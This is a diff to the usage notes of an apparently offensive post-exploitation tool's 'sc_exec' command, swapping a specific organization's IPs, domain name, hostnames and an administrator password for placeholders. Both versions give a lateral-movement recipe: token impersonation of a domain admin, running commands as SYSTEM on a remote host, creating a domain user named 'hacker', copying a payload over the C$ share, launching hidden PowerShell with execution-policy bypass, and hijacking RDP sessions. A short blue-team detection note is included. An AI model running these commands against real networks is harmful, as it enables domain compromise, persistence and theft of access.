@@ -39,14 +39,14 @@ Executes a command as **SYSTEM** on a remote Windows host via the Service Contro
 ```
 # Modo token implícito (após token_steal)
 token_steal 1884
-sc_exec 10.12.193.4 "whoami > C:\Windows\Temp\o.txt 2>&1"
-download 10.12.193.4 C:\Windows\Temp\o.txt
+sc_exec 192.168.1.10 "whoami > C:\Windows\Temp\o.txt 2>&1"
+download 192.168.1.10 C:\Windows\Temp\o.txt
 
 # Modo credencial explícita
-sc_exec 10.12.193.4 "net user hacker P@ss123 /add /domain" COPEL\administrator Senha@123
+sc_exec 192.168.1.10 "net user hacker P@ss123 /add /domain" CORP\administrator P@ssw0rd
 
 # Deploy de agente Anubis como SYSTEM no host lateral
-sc_exec 10.12.193.4 "powershell -ep bypass -WindowStyle Hidden -f C:\Windows\Temp\a.ps1"
+sc_exec 192.168.1.10 "powershell -ep bypass -WindowStyle Hidden -f C:\Windows\Temp\a.ps1"
 ```
 
 ## Technique Detail
@@ -93,21 +93,21 @@ sc_exec 10.12.193.4 "powershell -ep bypass -WindowStyle Hidden -f C:\Windows\Tem
 - **Requisito de rede:** TCP/445 (SMB pipe `svcctl`) para comunicação com o SCM remoto.
 - **Detecção (blue team):** Sysmon EID 1 (process create no alvo), Security EID 4697 (service install), System EID 7045.
 
-### Lateral Movement Flow (COPEL context)
+### Lateral Movement Flow
 
 ```
-# P483078 comprometido → deploy no P489039 (Win11)
+# HOST-A comprometido → deploy no HOST-B (Win11)
 
 token_steal                    # lista tokens disponíveis
-token_steal 1884               # impersona domain admin (ex: Oracle service account)
+token_steal 1884               # impersona domain admin (token de conta privilegiada)
 
 # Copia payload via share (token impersonado)
-shell copy C:\Temp\a.ps1 \\10.12.193.4\C$\Windows\Temp\a.ps1
+shell copy C:\Temp\a.ps1 \\192.168.1.10\C$\Windows\Temp\a.ps1
 
 # Executa como SYSTEM via SCM (sem sc.exe)
-sc_exec 10.12.193.4 "powershell -ep bypass -f C:\Windows\Temp\a.ps1"
+sc_exec 192.168.1.10 "powershell -ep bypass -f C:\Windows\Temp\a.ps1"
 
-# Novo agente Anubis agora roda como SYSTEM no P489039
+# Novo agente Anubis agora roda como SYSTEM no HOST-B
 rdp_hijack          # lista sessões RDP no novo host
 ```
 
